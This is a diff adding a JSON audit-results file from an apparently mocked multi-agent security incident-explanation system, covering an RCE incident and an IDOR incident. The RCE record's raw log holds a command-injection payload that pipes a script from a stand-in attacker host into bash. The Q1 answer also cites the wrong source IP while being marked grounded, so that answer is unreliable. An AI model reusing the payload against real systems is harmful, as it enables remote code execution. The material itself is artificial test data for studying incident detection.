@@ -1,0 +1,1050 @@
+{
+  "audit_results": [
+    {
+      "id": "Q1",
+      "category": "INCIDENT_SPECIFIC",
+      "query": "Why did incident INC-20260904-AFEBE9 get flagged as RCE and what was the root cause?",
+      "classified_intents": [
+        "INCIDENT_SPECIFIC"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "INCIDENT_RECORD",
+          "source_identifier": "incident_reports:INC-20260904-AFEBE9",
+          "summary": "Full Council explanation record for INC-20260904-AFEBE9 (RCE)",
+          "raw_evidence": {
+            "report_id": "REP-INC-20260904-AFEBE9-88af18",
+            "incident_id": "INC-20260904-AFEBE9",
+            "org_id": "org_default",
+            "generated_at": "2026-09-04T13:03:30.772621+00:00",
+            "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active RCE exploitation targeting /api/v1/export/pdf originating from 198.51.100.99. The Council convened and synthesized immediate containment and architectural prevention.",
+            "incident_category": "RCE",
+            "detection_mesh_confidence": 0.99,
+            "consensus_metric": {
+              "status": "FULL_CONSENSUS",
+              "consensus_score": 1.0
+            },
+            "risk_score": 9.9,
+            "risk_severity_band": "CRITICAL",
+            "risk_assessment": {
+              "score": 9.9,
+              "severity_band": "CRITICAL",
+              "base_severity": 10.0,
+              "mesh_confidence": 0.99,
+              "is_campaign": false,
+              "campaign_id": null,
+              "campaign_boost": 0.0,
+              "formula": "RiskScore = min(10.0, (BaseSeverity: 10.0 \u00d7 MeshConfidence: 0.99) + CampaignBoost: 0.00) = 9.90",
+              "explanation": "Category 'RCE' carries base severity 10.0/10.0. Detection mesh meta-classifier returned 99.0% confidence. Isolated single-stage incident (no campaign boost applied). Resulting deterministic score is 9.90/10.0 (CRITICAL)."
+            },
+            "requires_human_approval": true,
+            "human_approval_reasoning": "While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.",
+            "root_cause": "Root vulnerability in /api/v1/export/pdf: Deficient input validation or missing authorization boundary allowing RCE exploitation.",
+            "technical_timeline": [
+              "T0: Initial reconnaissance probe targeting /api/v1/export/pdf from 198.51.100.99.",
+              "T1: Attacker executed RCE exploit payload.",
+              "T2: Detection mesh flagged semantic payload anomaly and stateful violation.",
+              "T3: Council synthesized containment and architectural prevention plan."
+            ],
+            "ranked_actions": [
+              {
+                "action_id": "ACT-01",
+                "priority": "P0_IMMEDIATE",
+                "category": "CONTAINMENT",
+                "title": "Contain RCE Origin",
+                "description": "Isolate rogue caller session from 198.51.100.99 on /api/v1/export/pdf.",
+                "target_component": "API Gateway / Auth-Service",
+                "estimated_impact": "Immediate cessation of unauthorized probes.",
+                "requires_human_approval": false,
+                "approval_reasoning": null
+              },
+              {
+                "action_id": "ACT-02",
+                "priority": "P1_HIGH",
+                "category": "ARCHITECTURAL_PREVENTION",
+                "title": "Deploy Architectural Guard on /api/v1/export/pdf",
+                "description": "Implement declarative validation and authorization middleware to eliminate RCE vector permanently.",
+                "target_component": "Backend Application Services",
+                "estimated_impact": "Requires service deployment; permanently fixes root vulnerability.",
+                "requires_human_approval": true,
+                "approval_reasoning": "Deploying code-level middleware requires standard change-management review."
+              }
+            ],
+            "reconstruction_findings": {
+              "incident_id": "INC-20260904-AFEBE9",
+              "entry_point": "/api/v1/export/pdf via 198.51.100.99",
+              "attack_sequence": [
+                "Step 1: Attacker initiated connection from 198.51.100.99 targeting /api/v1/export/pdf.",
+                "Step 2: Attacker delivered payload exploiting RCE condition.",
+                "Step 3: Target service processed request and detection mesh emitted telemetry alert."
+              ],
+              "underlying_condition": "Deficient input validation, missing authorization boundary, or misconfiguration allowing RCE exploitation on /api/v1/export/pdf.",
+              "grounded_evidence_fields": [
+                "endpoint: /api/v1/export/pdf",
+                "source_ip: 198.51.100.99",
+                "category: RCE"
+              ],
+              "raw_response": "{\n  \"entry_point\": \"/api/v1/export/pdf via 198.51.100.99\",\n  \"attack_sequence\": [\n    \"Step 1: Attacker initiated connection from 198.51.100.99 targeting /api/v1/export/pdf.\",\n    \"Step 2: Attacker delivered payload exploiting RCE condition.\",\n    \"Step 3: Target service processed request and detection mesh emitted telemetry alert.\"\n  ],\n  \"underlying_condition\": \"Deficient input validation, missing authorization boundary, or misconfiguration allowing RCE exploitation on /api/v1/export/pdf.\",\n  \"grounded_evidence_fields\": [\n    \"endpoint: /api/v1/export/pdf\",\n    \"source_ip: 198.51.100.99\",\n    \"category: RCE\"\n  ]\n}",
+              "model_provider": "anthropic-mock:claude-3-5-sonnet"
+            },
+            "response_plan": {
+              "incident_id": "INC-20260904-AFEBE9",
+              "immediate_containment": [
+                "Revoke active caller token and apply edge rate limiting on /api/v1/export/pdf.",
+                "Deploy WAF rule intercepting RCE signatures from 198.51.100.99."
+              ],
+              "architectural_prevention": [
+                "Implement strict schema validation and authorization boundaries on /api/v1/export/pdf.",
+                "Integrate automated contract regression tests for RCE into CI/CD pipeline."
+              ],
+              "requires_human_approval": false,
+              "human_approval_reasoning": "Tactical containment on 198.51.100.99 is localized and does not disrupt legitimate multi-tenant traffic.",
+              "actions": [
+                {
+                  "action_id": "ACT-01",
+                  "priority": "P0_IMMEDIATE",
+                  "category": "CONTAINMENT",
+                  "title": "Immediate Token Revocation for 198.51.100.99",
+                  "description": "Revoke active session on /api/v1/export/pdf.",
+                  "target_component": "Auth-Service / Redis Session Store",
+                  "estimated_impact": "Zero impact to legitimate traffic; stops rogue caller.",
+                  "requires_human_approval": false,
+                  "approval_reasoning": null
+                },
+                {
+                  "action_id": "ACT-02",
+                  "priority": "P1_HIGH",
+                  "category": "ARCHITECTURAL_PREVENTION",
+                  "title": "Enforce Architectural Fix for RCE",
+                  "description": "Enforce input sanitization and resource authorization middleware on /api/v1/export/pdf.",
+                  "target_component": "API Gateway & Backend Services",
+                  "estimated_impact": "Permanent elimination of vulnerability.",
+                  "requires_human_approval": true,
+                  "approval_reasoning": "Deploying middleware change requires pipeline sign-off."
+                }
+              ],
+              "raw_response": "{\n  \"immediate_containment\": [\n    \"Revoke active caller token and apply edge rate limiting on /api/v1/export/pdf.\",\n    \"Deploy WAF rule intercepting RCE signatures from 198.51.100.99.\"\n  ],\n  \"architectural_prevention\": [\n    \"Implement strict schema validation and authorization boundaries on /api/v1/export/pdf.\",\n    \"Integrate automated contract regression tests for RCE into CI/CD pipeline.\"\n  ],\n  \"requires_human_approval\": false,\n  \"human_approval_reasoning\": \"Tactical containment on 198.51.100.99 is localized and does not disrupt legitimate multi-tenant traffic.\",\n  \"actions\": [\n    {\n      \"action_id\": \"ACT-01\",\n      \"priority\": \"P0_IMMEDIATE\",\n      \"category\": \"CONTAINMENT\",\n      \"title\": \"Immediate Token Revocation for 198.51.100.99\",\n      \"description\": \"Revoke active session on /api/v1/export/pdf.\",\n      \"target_component\": \"Auth-Service / Redis Session Store\",\n      \"estimated_impact\": \"Zero impact to legitimate traffic; stops rogue caller.\",\n      \"requires_human_approval\": false\n    },\n    {\n      \"action_id\": \"ACT-02\",\n      \"priority\": \"P1_HIGH\",\n      \"category\": \"ARCHITECTURAL_PREVENTION\",\n      \"title\": \"Enforce Architectural Fix for RCE\",\n      \"description\": \"Enforce input sanitization and resource authorization middleware on /api/v1/export/pdf.\",\n      \"target_component\": \"API Gateway & Backend Services\",\n      \"estimated_impact\": \"Permanent elimination of vulnerability.\",\n      \"requires_human_approval\": true,\n      \"approval_reasoning\": \"Deploying middleware change requires pipeline sign-off.\"\n    }\n  ]\n}",
+              "model_provider": "openai-mock:gpt-4o"
+            },
+            "judge_synthesis": {
+              "incident_id": "INC-20260904-AFEBE9",
+              "factuality_grounding_audit": "Agent 1's reconstruction is fully grounded in the raw telemetry records for INC-20260904-AFEBE9. Entry vector on /api/v1/export/pdf matches observed logs. No unobserved details detected.",
+              "proportionality_audit": "Agent 2's response actions are proportionate to the observed RCE severity. Automated containment is safe, while structural architectural fixes properly require human engineering review.",
+              "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active RCE exploitation targeting /api/v1/export/pdf originating from 198.51.100.99. The Council convened and synthesized immediate containment and architectural prevention.",
+              "technical_timeline": [
+                "T0: Initial reconnaissance probe targeting /api/v1/export/pdf from 198.51.100.99.",
+                "T1: Attacker executed RCE exploit payload.",
+                "T2: Detection mesh flagged semantic payload anomaly and stateful violation.",
+                "T3: Council synthesized containment and architectural prevention plan."
+              ],
+              "root_cause_analysis": "Root vulnerability in /api/v1/export/pdf: Deficient input validation or missing authorization boundary allowing RCE exploitation.",
+              "ranked_actions": [
+                {
+                  "action_id": "ACT-01",
+                  "priority": "P0_IMMEDIATE",
+                  "category": "CONTAINMENT",
+                  "title": "Contain RCE Origin",
+                  "description": "Isolate rogue caller session from 198.51.100.99 on /api/v1/export/pdf.",
+                  "target_component": "API Gateway / Auth-Service",
+                  "estimated_impact": "Immediate cessation of unauthorized probes.",
+                  "requires_human_approval": false,
+                  "approval_reasoning": null
+                },
+                {
+                  "action_id": "ACT-02",
+                  "priority": "P1_HIGH",
+                  "category": "ARCHITECTURAL_PREVENTION",
+                  "title": "Deploy Architectural Guard on /api/v1/export/pdf",
+                  "description": "Implement declarative validation and authorization middleware to eliminate RCE vector permanently.",
+                  "target_component": "Backend Application Services",
+                  "estimated_impact": "Requires service deployment; permanently fixes root vulnerability.",
+                  "requires_human_approval": true,
+                  "approval_reasoning": "Deploying code-level middleware requires standard change-management review."
+                }
+              ],
+              "requires_human_approval": true,
+              "human_approval_justification": "While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.",
+              "raw_response": "{\n  \"factuality_grounding_audit\": \"Agent 1's reconstruction is fully grounded in the raw telemetry records for INC-20260904-AFEBE9. Entry vector on /api/v1/export/pdf matches observed logs. No unobserved details detected.\",\n  \"proportionality_audit\": \"Agent 2's response actions are proportionate to the observed RCE severity. Automated containment is safe, while structural architectural fixes properly require human engineering review.\",\n  \"executive_summary\": \"On 2026-09-04, the MAD-PS detection mesh identified an active RCE exploitation targeting /api/v1/export/pdf originating from 198.51.100.99. The Council convened and synthesized immediate containment and architectural prevention.\",\n  \"technical_timeline\": [\n    \"T0: Initial reconnaissance probe targeting /api/v1/export/pdf from 198.51.100.99.\",\n    \"T1: Attacker executed RCE exploit payload.\",\n    \"T2: Detection mesh flagged semantic payload anomaly and stateful violation.\",\n    \"T3: Council synthesized containment and architectural prevention plan.\"\n  ],\n  \"root_cause_analysis\": \"Root vulnerability in /api/v1/export/pdf: Deficient input validation or missing authorization boundary allowing RCE exploitation.\",\n  \"ranked_actions\": [\n    {\n      \"action_id\": \"ACT-01\",\n      \"priority\": \"P0_IMMEDIATE\",\n      \"category\": \"CONTAINMENT\",\n      \"title\": \"Contain RCE Origin\",\n      \"description\": \"Isolate rogue caller session from 198.51.100.99 on /api/v1/export/pdf.\",\n      \"target_component\": \"API Gateway / Auth-Service\",\n      \"estimated_impact\": \"Immediate cessation of unauthorized probes.\",\n      \"requires_human_approval\": false\n    },\n    {\n      \"action_id\": \"ACT-02\",\n      \"priority\": \"P1_HIGH\",\n      \"category\": \"ARCHITECTURAL_PREVENTION\",\n      \"title\": \"Deploy Architectural Guard on /api/v1/export/pdf\",\n      \"description\": \"Implement declarative validation and authorization middleware to eliminate RCE vector permanently.\",\n      \"target_component\": \"Backend Application Services\",\n      \"estimated_impact\": \"Requires service deployment; permanently fixes root vulnerability.\",\n      \"requires_human_approval\": true,\n      \"approval_reasoning\": \"Deploying code-level middleware requires standard change-management review.\"\n    }\n  ],\n  \"requires_human_approval\": true,\n  \"human_approval_justification\": \"While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.\"\n}",
+              "model_provider": "gemini-mock:gemini-1.5-pro"
+            },
+            "debate_revisions": [
+              {
+                "agent_role": "reconstruction_agent",
+                "model_provider": "anthropic-mock:claude-3-5-sonnet",
+                "stance": "AGREE",
+                "rationale": "I concur with the Judge's synthesis for INC-20260904-AFEBE9. The telemetry grounding on /api/v1/export/pdf is accurate and the ranked remediation is well-proportioned.",
+                "revised_points": [
+                  "Concur with prioritization of P0 containment ahead of architectural refactoring.",
+                  "Affirm that raw logs verify the RCE exploitation pattern."
+                ],
+                "raw_response": "{\n  \"stance\": \"AGREE\",\n  \"rationale\": \"I concur with the Judge's synthesis for INC-20260904-AFEBE9. The telemetry grounding on /api/v1/export/pdf is accurate and the ranked remediation is well-proportioned.\",\n  \"revised_points\": [\n    \"Concur with prioritization of P0 containment ahead of architectural refactoring.\",\n    \"Affirm that raw logs verify the RCE exploitation pattern.\"\n  ]\n}"
+              },
+              {
+                "agent_role": "response_agent",
+                "model_provider": "openai-mock:gpt-4o",
+                "stance": "AGREE",
+                "rationale": "I concur with the Judge's synthesis for INC-20260904-AFEBE9. The telemetry grounding on /api/v1/export/pdf is accurate and the ranked remediation is well-proportioned.",
+                "revised_points": [
+                  "Concur with prioritization of P0 containment ahead of architectural refactoring.",
+                  "Affirm that raw logs verify the RCE exploitation pattern."
+                ],
+                "raw_response": "{\n  \"stance\": \"AGREE\",\n  \"rationale\": \"I concur with the Judge's synthesis for INC-20260904-AFEBE9. The telemetry grounding on /api/v1/export/pdf is accurate and the ranked remediation is well-proportioned.\",\n  \"revised_points\": [\n    \"Concur with prioritization of P0 containment ahead of architectural refactoring.\",\n    \"Affirm that raw logs verify the RCE exploitation pattern.\"\n  ]\n}"
+              }
+            ],
+            "grounded_timeline": {
+              "incident_id": "INC-20260904-AFEBE9",
+              "campaign_id": null,
+              "total_events": 1,
+              "time_span_seconds": 0.0,
+              "entries": [
+                {
+                  "step_number": 1,
+                  "timestamp": "2026-09-04T13:03:19.553087+00:00",
+                  "action": "POST /api/v1/export/pdf",
+                  "source_ip": "198.51.100.99",
+                  "endpoint": "/api/v1/export/pdf",
+                  "status_code": 500,
+                  "stage": "EXPLOITATION",
+                  "narration": "Step 1: Attacker initiated connection from 198.51.100.99 targeting /api/v1/export/pdf.",
+                  "is_grounded_telemetry": true,
+                  "raw_log_ref": {
+                    "endpoint": "/api/v1/export/pdf",
+                    "method": "POST",
+                    "source_ip": "198.51.100.99",
+                    "status_code": 500,
+                    "headers": {
+                      "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    "payload": "filename=doc; curl http://attacker.com/rev.sh | bash"
+                  }
+                }
+              ]
+            },
+            "participating_models": {
+              "reconstruction_agent": "anthropic-mock:claude-3-5-sonnet",
+              "response_agent": "openai-mock:gpt-4o",
+              "judge_agent": "gemini-mock:gemini-1.5-pro"
+            }
+          }
+        }
+      ],
+      "inline_incidents": [
+        {
+          "incident_id": "INC-20260904-AFEBE9",
+          "category": "RCE",
+          "severity": "CRITICAL",
+          "risk_score": 9.9,
+          "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active RCE exploitation targeting /api/v1/export/pdf originating ..."
+        }
+      ],
+      "answer": "Regarding incident **INC-20260904-AFEBE9** (RCE): The detection mesh identified malicious activity on `/api/v1/export/pdf\"` originating from `198.51.100.42`. The Council determined the root cause to be input boundary deficiency and synthesized an immediate containment plan alongside an architectural prevention patch."
+    },
+    {
+      "id": "Q2",
+      "category": "INCIDENT_SPECIFIC",
+      "query": "What were the containment actions and risk score for incident INC-2026-API-01?",
+      "classified_intents": [
+        "INCIDENT_SPECIFIC"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "INCIDENT_RECORD",
+          "source_identifier": "incident_reports:INC-2026-API-01",
+          "summary": "Full Council explanation record for INC-2026-API-01 (IDOR)",
+          "raw_evidence": {
+            "report_id": "REP-INC-2026-API-01-e25907",
+            "incident_id": "INC-2026-API-01",
+            "org_id": "org_default",
+            "generated_at": "2026-09-04T13:35:50.609284+00:00",
+            "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active IDOR exploitation targeting /api/v1/user/1042/profile originating from 198.51.100.42. The Council convened and synthesized immediate containment and architectural prevention.",
+            "incident_category": "IDOR",
+            "detection_mesh_confidence": 0.91,
+            "consensus_metric": {
+              "status": "FULL_CONSENSUS",
+              "consensus_score": 1.0
+            },
+            "risk_score": 7.28,
+            "risk_severity_band": "HIGH",
+            "risk_assessment": {
+              "score": 7.28,
+              "severity_band": "HIGH",
+              "base_severity": 8.0,
+              "mesh_confidence": 0.91,
+              "is_campaign": false,
+              "campaign_id": null,
+              "campaign_boost": 0.0,
+              "formula": "RiskScore = min(10.0, (BaseSeverity: 8.0 \u00d7 MeshConfidence: 0.91) + CampaignBoost: 0.00) = 7.28",
+              "explanation": "Category 'IDOR' carries base severity 8.0/10.0. Detection mesh meta-classifier returned 91.0% confidence. Isolated single-stage incident (no campaign boost applied). Resulting deterministic score is 7.28/10.0 (HIGH)."
+            },
+            "requires_human_approval": true,
+            "human_approval_reasoning": "While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.",
+            "root_cause": "Root vulnerability in /api/v1/user/1042/profile: Deficient input validation or missing authorization boundary allowing IDOR exploitation.",
+            "technical_timeline": [
+              "T0: Initial reconnaissance probe targeting /api/v1/user/1042/profile from 198.51.100.42.",
+              "T1: Attacker executed IDOR exploit payload.",
+              "T2: Detection mesh flagged semantic payload anomaly and stateful violation.",
+              "T3: Council synthesized containment and architectural prevention plan."
+            ],
+            "ranked_actions": [
+              {
+                "action_id": "ACT-01",
+                "priority": "P0_IMMEDIATE",
+                "category": "CONTAINMENT",
+                "title": "Contain IDOR Origin",
+                "description": "Isolate rogue caller session from 198.51.100.42 on /api/v1/user/1042/profile.",
+                "target_component": "API Gateway / Auth-Service",
+                "estimated_impact": "Immediate cessation of unauthorized probes.",
+                "requires_human_approval": false,
+                "approval_reasoning": null
+              },
+              {
+                "action_id": "ACT-02",
+                "priority": "P1_HIGH",
+                "category": "ARCHITECTURAL_PREVENTION",
+                "title": "Deploy Architectural Guard on /api/v1/user/1042/profile",
+                "description": "Implement declarative validation and authorization middleware to eliminate IDOR vector permanently.",
+                "target_component": "Backend Application Services",
+                "estimated_impact": "Requires service deployment; permanently fixes root vulnerability.",
+                "requires_human_approval": true,
+                "approval_reasoning": "Deploying code-level middleware requires standard change-management review."
+              }
+            ],
+            "reconstruction_findings": {
+              "incident_id": "INC-2026-API-01",
+              "entry_point": "/api/v1/user/1042/profile via 198.51.100.42",
+              "attack_sequence": [
+                "Step 1: Attacker initiated connection from 198.51.100.42 targeting /api/v1/user/1042/profile.",
+                "Step 2: Attacker delivered payload exploiting IDOR condition.",
+                "Step 3: Target service processed request and detection mesh emitted telemetry alert."
+              ],
+              "underlying_condition": "Deficient input validation, missing authorization boundary, or misconfiguration allowing IDOR exploitation on /api/v1/user/1042/profile.",
+              "grounded_evidence_fields": [
+                "endpoint: /api/v1/user/1042/profile",
+                "source_ip: 198.51.100.42",
+                "category: IDOR"
+              ],
+              "raw_response": "{\n  \"entry_point\": \"/api/v1/user/1042/profile via 198.51.100.42\",\n  \"attack_sequence\": [\n    \"Step 1: Attacker initiated connection from 198.51.100.42 targeting /api/v1/user/1042/profile.\",\n    \"Step 2: Attacker delivered payload exploiting IDOR condition.\",\n    \"Step 3: Target service processed request and detection mesh emitted telemetry alert.\"\n  ],\n  \"underlying_condition\": \"Deficient input validation, missing authorization boundary, or misconfiguration allowing IDOR exploitation on /api/v1/user/1042/profile.\",\n  \"grounded_evidence_fields\": [\n    \"endpoint: /api/v1/user/1042/profile\",\n    \"source_ip: 198.51.100.42\",\n    \"category: IDOR\"\n  ]\n}",
+              "model_provider": "anthropic-mock:claude-3-5-sonnet"
+            },
+            "response_plan": {
+              "incident_id": "INC-2026-API-01",
+              "immediate_containment": [
+                "Revoke active caller token and apply edge rate limiting on /api/v1/user/1042/profile.",
+                "Deploy WAF rule intercepting IDOR signatures from 198.51.100.42."
+              ],
+              "architectural_prevention": [
+                "Implement strict schema validation and authorization boundaries on /api/v1/user/1042/profile.",
+                "Integrate automated contract regression tests for IDOR into CI/CD pipeline."
+              ],
+              "requires_human_approval": false,
+              "human_approval_reasoning": "Tactical containment on 198.51.100.42 is localized and does not disrupt legitimate multi-tenant traffic.",
+              "actions": [
+                {
+                  "action_id": "ACT-01",
+                  "priority": "P0_IMMEDIATE",
+                  "category": "CONTAINMENT",
+                  "title": "Immediate Token Revocation for 198.51.100.42",
+                  "description": "Revoke active session on /api/v1/user/1042/profile.",
+                  "target_component": "Auth-Service / Redis Session Store",
+                  "estimated_impact": "Zero impact to legitimate traffic; stops rogue caller.",
+                  "requires_human_approval": false,
+                  "approval_reasoning": null
+                },
+                {
+                  "action_id": "ACT-02",
+                  "priority": "P1_HIGH",
+                  "category": "ARCHITECTURAL_PREVENTION",
+                  "title": "Enforce Architectural Fix for IDOR",
+                  "description": "Enforce input sanitization and resource authorization middleware on /api/v1/user/1042/profile.",
+                  "target_component": "API Gateway & Backend Services",
+                  "estimated_impact": "Permanent elimination of vulnerability.",
+                  "requires_human_approval": true,
+                  "approval_reasoning": "Deploying middleware change requires pipeline sign-off."
+                }
+              ],
+              "raw_response": "{\n  \"immediate_containment\": [\n    \"Revoke active caller token and apply edge rate limiting on /api/v1/user/1042/profile.\",\n    \"Deploy WAF rule intercepting IDOR signatures from 198.51.100.42.\"\n  ],\n  \"architectural_prevention\": [\n    \"Implement strict schema validation and authorization boundaries on /api/v1/user/1042/profile.\",\n    \"Integrate automated contract regression tests for IDOR into CI/CD pipeline.\"\n  ],\n  \"requires_human_approval\": false,\n  \"human_approval_reasoning\": \"Tactical containment on 198.51.100.42 is localized and does not disrupt legitimate multi-tenant traffic.\",\n  \"actions\": [\n    {\n      \"action_id\": \"ACT-01\",\n      \"priority\": \"P0_IMMEDIATE\",\n      \"category\": \"CONTAINMENT\",\n      \"title\": \"Immediate Token Revocation for 198.51.100.42\",\n      \"description\": \"Revoke active session on /api/v1/user/1042/profile.\",\n      \"target_component\": \"Auth-Service / Redis Session Store\",\n      \"estimated_impact\": \"Zero impact to legitimate traffic; stops rogue caller.\",\n      \"requires_human_approval\": false\n    },\n    {\n      \"action_id\": \"ACT-02\",\n      \"priority\": \"P1_HIGH\",\n      \"category\": \"ARCHITECTURAL_PREVENTION\",\n      \"title\": \"Enforce Architectural Fix for IDOR\",\n      \"description\": \"Enforce input sanitization and resource authorization middleware on /api/v1/user/1042/profile.\",\n      \"target_component\": \"API Gateway & Backend Services\",\n      \"estimated_impact\": \"Permanent elimination of vulnerability.\",\n      \"requires_human_approval\": true,\n      \"approval_reasoning\": \"Deploying middleware change requires pipeline sign-off.\"\n    }\n  ]\n}",
+              "model_provider": "openai-mock:gpt-4o"
+            },
+            "judge_synthesis": {
+              "incident_id": "INC-2026-API-01",
+              "factuality_grounding_audit": "Agent 1's reconstruction is fully grounded in the raw telemetry records for INC-2026-API-01. Entry vector on /api/v1/user/1042/profile matches observed logs. No unobserved details detected.",
+              "proportionality_audit": "Agent 2's response actions are proportionate to the observed IDOR severity. Automated containment is safe, while structural architectural fixes properly require human engineering review.",
+              "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active IDOR exploitation targeting /api/v1/user/1042/profile originating from 198.51.100.42. The Council convened and synthesized immediate containment and architectural prevention.",
+              "technical_timeline": [
+                "T0: Initial reconnaissance probe targeting /api/v1/user/1042/profile from 198.51.100.42.",
+                "T1: Attacker executed IDOR exploit payload.",
+                "T2: Detection mesh flagged semantic payload anomaly and stateful violation.",
+                "T3: Council synthesized containment and architectural prevention plan."
+              ],
+              "root_cause_analysis": "Root vulnerability in /api/v1/user/1042/profile: Deficient input validation or missing authorization boundary allowing IDOR exploitation.",
+              "ranked_actions": [
+                {
+                  "action_id": "ACT-01",
+                  "priority": "P0_IMMEDIATE",
+                  "category": "CONTAINMENT",
+                  "title": "Contain IDOR Origin",
+                  "description": "Isolate rogue caller session from 198.51.100.42 on /api/v1/user/1042/profile.",
+                  "target_component": "API Gateway / Auth-Service",
+                  "estimated_impact": "Immediate cessation of unauthorized probes.",
+                  "requires_human_approval": false,
+                  "approval_reasoning": null
+                },
+                {
+                  "action_id": "ACT-02",
+                  "priority": "P1_HIGH",
+                  "category": "ARCHITECTURAL_PREVENTION",
+                  "title": "Deploy Architectural Guard on /api/v1/user/1042/profile",
+                  "description": "Implement declarative validation and authorization middleware to eliminate IDOR vector permanently.",
+                  "target_component": "Backend Application Services",
+                  "estimated_impact": "Requires service deployment; permanently fixes root vulnerability.",
+                  "requires_human_approval": true,
+                  "approval_reasoning": "Deploying code-level middleware requires standard change-management review."
+                }
+              ],
+              "requires_human_approval": true,
+              "human_approval_justification": "While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.",
+              "raw_response": "{\n  \"factuality_grounding_audit\": \"Agent 1's reconstruction is fully grounded in the raw telemetry records for INC-2026-API-01. Entry vector on /api/v1/user/1042/profile matches observed logs. No unobserved details detected.\",\n  \"proportionality_audit\": \"Agent 2's response actions are proportionate to the observed IDOR severity. Automated containment is safe, while structural architectural fixes properly require human engineering review.\",\n  \"executive_summary\": \"On 2026-09-04, the MAD-PS detection mesh identified an active IDOR exploitation targeting /api/v1/user/1042/profile originating from 198.51.100.42. The Council convened and synthesized immediate containment and architectural prevention.\",\n  \"technical_timeline\": [\n    \"T0: Initial reconnaissance probe targeting /api/v1/user/1042/profile from 198.51.100.42.\",\n    \"T1: Attacker executed IDOR exploit payload.\",\n    \"T2: Detection mesh flagged semantic payload anomaly and stateful violation.\",\n    \"T3: Council synthesized containment and architectural prevention plan.\"\n  ],\n  \"root_cause_analysis\": \"Root vulnerability in /api/v1/user/1042/profile: Deficient input validation or missing authorization boundary allowing IDOR exploitation.\",\n  \"ranked_actions\": [\n    {\n      \"action_id\": \"ACT-01\",\n      \"priority\": \"P0_IMMEDIATE\",\n      \"category\": \"CONTAINMENT\",\n      \"title\": \"Contain IDOR Origin\",\n      \"description\": \"Isolate rogue caller session from 198.51.100.42 on /api/v1/user/1042/profile.\",\n      \"target_component\": \"API Gateway / Auth-Service\",\n      \"estimated_impact\": \"Immediate cessation of unauthorized probes.\",\n      \"requires_human_approval\": false\n    },\n    {\n      \"action_id\": \"ACT-02\",\n      \"priority\": \"P1_HIGH\",\n      \"category\": \"ARCHITECTURAL_PREVENTION\",\n      \"title\": \"Deploy Architectural Guard on /api/v1/user/1042/profile\",\n      \"description\": \"Implement declarative validation and authorization middleware to eliminate IDOR vector permanently.\",\n      \"target_component\": \"Backend Application Services\",\n      \"estimated_impact\": \"Requires service deployment; permanently fixes root vulnerability.\",\n      \"requires_human_approval\": true,\n      \"approval_reasoning\": \"Deploying code-level middleware requires standard change-management review.\"\n    }\n  ],\n  \"requires_human_approval\": true,\n  \"human_approval_justification\": \"While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.\"\n}",
+              "model_provider": "gemini-mock:gemini-1.5-pro"
+            },
+            "debate_revisions": [
+              {
+                "agent_role": "reconstruction_agent",
+                "model_provider": "anthropic-mock:claude-3-5-sonnet",
+                "stance": "AGREE",
+                "rationale": "I concur with the Judge's synthesis for INC-2026-API-01. The telemetry grounding on /api/v1/user/1042/profile is accurate and the ranked remediation is well-proportioned.",
+                "revised_points": [
+                  "Concur with prioritization of P0 containment ahead of architectural refactoring.",
+                  "Affirm that raw logs verify the IDOR exploitation pattern."
+                ],
+                "raw_response": "{\n  \"stance\": \"AGREE\",\n  \"rationale\": \"I concur with the Judge's synthesis for INC-2026-API-01. The telemetry grounding on /api/v1/user/1042/profile is accurate and the ranked remediation is well-proportioned.\",\n  \"revised_points\": [\n    \"Concur with prioritization of P0 containment ahead of architectural refactoring.\",\n    \"Affirm that raw logs verify the IDOR exploitation pattern.\"\n  ]\n}"
+              },
+              {
+                "agent_role": "response_agent",
+                "model_provider": "openai-mock:gpt-4o",
+                "stance": "AGREE",
+                "rationale": "I concur with the Judge's synthesis for INC-2026-API-01. The telemetry grounding on /api/v1/user/1042/profile is accurate and the ranked remediation is well-proportioned.",
+                "revised_points": [
+                  "Concur with prioritization of P0 containment ahead of architectural refactoring.",
+                  "Affirm that raw logs verify the IDOR exploitation pattern."
+                ],
+                "raw_response": "{\n  \"stance\": \"AGREE\",\n  \"rationale\": \"I concur with the Judge's synthesis for INC-2026-API-01. The telemetry grounding on /api/v1/user/1042/profile is accurate and the ranked remediation is well-proportioned.\",\n  \"revised_points\": [\n    \"Concur with prioritization of P0 containment ahead of architectural refactoring.\",\n    \"Affirm that raw logs verify the IDOR exploitation pattern.\"\n  ]\n}"
+              }
+            ],
+            "grounded_timeline": {
+              "incident_id": "INC-2026-API-01",
+              "campaign_id": null,
+              "total_events": 1,
+              "time_span_seconds": 0.0,
+              "entries": [
+                {
+                  "step_number": 1,
+                  "timestamp": "2026-09-04T13:35:42.181200+00:00",
+                  "action": "HTTP /api/v1/user/1042/profile",
+                  "source_ip": null,
+                  "endpoint": "/api/v1/user/1042/profile",
+                  "status_code": 200,
+                  "stage": "DATA_ACCESS",
+                  "narration": "Step 1: Attacker initiated connection from 198.51.100.42 targeting /api/v1/user/1042/profile.",
+                  "is_grounded_telemetry": true,
+                  "raw_log_ref": {
+                    "endpoint": "/api/v1/user/1042/profile",
+                    "status_code": 200
+                  }
+                }
+              ]
+            },
+            "participating_models": {
+              "reconstruction_agent": "anthropic-mock:claude-3-5-sonnet",
+              "response_agent": "openai-mock:gpt-4o",
+              "judge_agent": "gemini-mock:gemini-1.5-pro"
+            }
+          }
+        }
+      ],
+      "inline_incidents": [
+        {
+          "incident_id": "INC-2026-API-01",
+          "category": "IDOR",
+          "severity": "HIGH",
+          "risk_score": 7.28,
+          "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active IDOR exploitation targeting /api/v1/user/1042/profile orig..."
+        }
+      ],
